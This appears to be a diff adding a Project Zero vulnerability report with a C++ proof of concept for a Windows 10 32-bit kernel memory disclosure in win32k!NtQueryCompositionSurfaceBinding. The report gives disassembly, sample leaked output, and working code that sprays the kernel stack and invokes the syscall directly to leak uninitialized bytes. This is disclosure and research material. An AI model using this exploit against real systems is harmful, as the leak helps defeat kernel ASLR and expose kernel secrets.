@@ -1,0 +1,119 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1307
+
+We have discovered that the win32k!NtQueryCompositionSurfaceBinding system call discloses portions of uninitialized kernel stack memory to user-mode clients, as tested on Windows 10 32-bit.
+
+The output buffer, and the corresponding temporary stack-based buffer in the kernel are 0x308 bytes in size. The first 4 and the trailing 0x300 bytes are zero'ed out at the beginning of the function:
+
+--- cut ---
+.text:0001939B                 mov     [ebp+var_324], ebx
+.text:000193A1                 push    300h            ; size_t
+.text:000193A6                 push    ebx             ; int
+.text:000193A7                 lea     eax, [ebp+var_31C]
+.text:000193AD                 push    eax             ; void *
+.text:000193AE                 call    _memset
+--- cut ---
+
+However, the remaining 4 bytes at offset 0x4 are never touched, and so they contain whatever data was written there by the previous system call. These 4 bytes are then subsequently leaked to the user-mode caller. Exploitation of this bug is further facilitated by the fact that the contents of the buffer are copied back to user-mode even if the syscall fails (e.g. composition surface handle can't be resolved etc).
+
+The attached proof-of-concept program demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call. An example output is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 41 41 41 41 00 00 00 00 00 00 00 00 ....AAAA........
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+[...]
+000002b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000002c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000002d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000002e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+000002f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000300: 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ................
+--- cut ---
+
+It is clearly visible here that among all data copied from ring-0 to ring-3, 4 bytes at offset 0x4 remained uninitialized. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <cstdio>
+
+extern "C"
+ULONG WINAPI NtMapUserPhysicalPages(
+    PVOID BaseAddress,
+    ULONG NumberOfPages,
+    PULONG PageFrameNumbers
+);
+
+// For native 32-bit execution.
+extern "C"
+ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
+  __asm{mov eax, ApiNumber};
+  __asm{lea edx, ApiNumber + 4};
+  __asm{int 0x2e};
+}
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  // Buffer allocated in static program memory, hence doesn't touch the local stack.
+  static BYTE buffer[4096];
+
+  // Fill the buffer with 'A's and spray the kernel stack.
+  MyMemset(buffer, 'A', sizeof(buffer));
+  NtMapUserPhysicalPages(buffer, sizeof(buffer) / sizeof(DWORD), (PULONG)buffer);
+
+  // Make sure that we're really not touching any user-mode stack by overwriting the buffer with 'B's.
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  // Windows 10 1607 32-bit.
+  CONST ULONG __NR_NtQueryCompositionSurfaceBinding = 0x13e0;
+
+  // Convert thread to GUI.
+  LoadLibrary(L"user32.dll");
+
+  // Spray the kernel stack to get visible results of the memory disclosure.
+  SprayKernelStack();
+
+  // Trigger the bug and display the output.
+  BYTE OutputBuffer[0x308] = { /* zero padding */ };
+  SystemCall32(__NR_NtQueryCompositionSurfaceBinding, 0, 0, OutputBuffer);
+
+  PrintHex(OutputBuffer, sizeof(OutputBuffer));
+
+  return 0;
+}
